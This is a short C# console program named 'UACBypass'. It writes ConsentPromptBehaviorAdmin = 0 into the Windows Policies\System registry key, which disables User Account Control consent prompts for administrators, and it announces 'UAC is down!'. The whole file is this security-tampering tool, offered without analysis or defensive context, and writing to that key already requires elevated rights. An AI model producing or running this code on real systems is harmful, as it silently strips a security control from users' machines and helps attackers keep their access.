using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace UACBypass
{
    class Program
    {
        static void Main(string[] args)
        {
            UAC_bypass();
        }

        private static void UAC_bypass()
        {
            try
            {
                Console.WriteLine("UAC is about to go down!");
                Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", Microsoft.Win32.RegistryKeyPermissionCheck.ReadWriteSubTree);
                key.SetValue("ConsentPromptBehaviorAdmin", 0);
                Console.WriteLine("UAC is down!");
            }
            catch (Exception ex)
            {

                Console.WriteLine("UAC_byPass() " + ex.Message);
            }
        }
    }
}
